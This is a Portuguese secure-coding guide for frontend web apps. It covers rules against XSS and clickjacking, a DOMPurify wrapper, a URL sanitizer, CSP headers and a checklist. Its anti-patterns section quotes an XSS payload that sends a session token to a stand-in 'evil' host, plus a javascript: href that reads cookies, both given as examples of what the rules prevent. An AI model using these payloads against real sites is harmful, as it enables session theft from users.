---
owasp: [A05, A02]
last-review: 2026-11-10
sources:
  - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
  - https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/default-src
---

# Segurança de Frontend

> O frontend roda na máquina do atacante. Tudo que está no bundle é público; tudo que entra no DOM sem tratamento é XSS em potencial. Específicos de React/TS estão em `../stack/react-typescript.md` — este módulo cobre o que vale para qualquer frontend web.

## Regras

- **R1 — NEVER** inserir HTML não confiável no DOM. `innerHTML`/`dangerouslySetInnerHTML` só através do wrapper sanitizado único do projeto (P1), nunca direto.
- **R2 — MUST** sanitizar URLs dinâmicas antes de usar em `href`/`src`: allowlist de protocolo (`https:`/`http:`). `javascript:` e `data:` em href executam código.
- **R3 — MUST** CSP configurada no host: mínimo `default-src 'self'` + `frame-ancestors 'none'` (anti-clickjacking) + `base-uri 'self'` + `form-action 'self'` + `object-src 'none'`. As três primeiras dessas diretivas **não herdam** de `default-src`: se não forem escritas, ficam sem restrição. Cada exceção (`unsafe-inline`, domínio extra) é dívida registrada, não default.
- **R4 — NEVER** secrets ou lógica de autorização no bundle. Esconder botão é UX; a segurança correspondente mora no servidor/RLS.
- **R5 — MUST** tokens de sessão preferencialmente em cookie `httpOnly`+`Secure`+`SameSite`. Se a stack exige localStorage (SPA com Supabase), compensar: CSP rígida, zero `innerHTML` fora do wrapper, dependências auditadas — XSS vira roubo de sessão direto.
- **R6 — MUST** `rel="noopener noreferrer"` em todo link `target="_blank"` para conteúdo de terceiros/usuários (anti tab-nabbing).
- **R7 — MUST** conteúdo gerado por usuário ou por LLM renderizado como TEXTO por default. Markdown→HTML só com sanitização (P1); nunca habilitar HTML cru de fonte externa.

## Padrões prontos

### P1 — Wrapper único de HTML dinâmico (DOMPurify)

<!-- ilustrativo -->

```tsx
import DOMPurify from "dompurify";

// ÚNICO lugar do projeto autorizado a usar dangerouslySetInnerHTML.
// Qualquer outro uso reprova em review.
const PURIFY_CONFIG = {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "ul", "ol", "li", "code", "pre", "a", "h1", "h2", "h3"],
  ALLOWED_ATTR: ["href"],
  ALLOWED_URI_REGEXP: /^https?:/i,   // links só http(s)
};

export function SafeHtml({ html, className }: { html: string; className?: string }) {
  const clean = DOMPurify.sanitize(html, PURIFY_CONFIG);
  return <div className={className} dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### P2 — Sanitizador de href dinâmico

<!-- kit: kit/web/safe-url.ts#safeHref -->
```typescript
/** Só http(s) vira href. `javascript:`, `data:`, `vbscript:` executam código no
 *  clique. `base` é a origem da página (`window.location.origin`). */
export function safeHref(raw: string | null | undefined, base: string): string {
  if (!raw) return "#";
  try {
    const url = new URL(raw.trim(), base);
    return url.protocol === "https:" || url.protocol === "http:" ? url.href : "#";
  } catch {
    return "#";
  }
}
// <a href={safeHref(item.link, window.location.origin)} target="_blank" rel="noopener noreferrer">
```

### P3 — Security headers no host (vercel.json)

```jsonc
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=()" },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://<seu-projeto>.supabase.co; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
        }
      ]
    }
  ]
}
// Ajustar connect-src/img-src ao projeto (o host exato, não *.supabase.co — o curinga
// libera o projeto de qualquer pessoa como destino de exfiltração). `img-src https:`
// reabre o canal de vazamento por imagem; liberar domínio por domínio.
// Começar restrito e abrir por necessidade comprovada — nunca aberto "para funcionar".
```

## Anti-padrões

```tsx
// ❌ NUNCA: HTML de usuário direto no DOM [viola R1]
<div dangerouslySetInnerHTML={{ __html: user.bio }} />
// bio = "<img src=x onerror=fetch('//evil/?c='+localStorage.token)>" → sessão roubada

// ❌ NUNCA: href cru de dados [viola R2]
<a href={item.link}>abrir</a>
// link = "javascript:alert(document.cookie)" executa no clique

// ❌ NUNCA: Markdown de LLM com HTML habilitado [viola R7]
<ReactMarkdown rehypePlugins={[rehypeRaw]}>{llmOutput}</ReactMarkdown>
// Prompt injection no conteúdo → HTML/JS do atacante renderizado no seu app

// ❌ NUNCA: autorização decidida no cliente [viola R4]
{user.role === "admin" && <DeleteAllButton />}  // ok como UX...
// ...desde que o endpoint de delete TAMBÉM cheque role no servidor.
```

## Checklist

- [ ] Nenhum `innerHTML`/`dangerouslySetInnerHTML` fora do wrapper `SafeHtml`?
- [ ] Hrefs/srcs dinâmicos passam por `safeHref`?
- [ ] CSP no host com `frame-ancestors`, `base-uri`, `form-action` e `object-src`; sem curinga em `connect-src`/`img-src`?
- [ ] Nenhum secret/decisão de segurança no bundle?
- [ ] Links externos com `noopener noreferrer`?
- [ ] Conteúdo de usuário/LLM renderizado como texto ou via wrapper sanitizado?
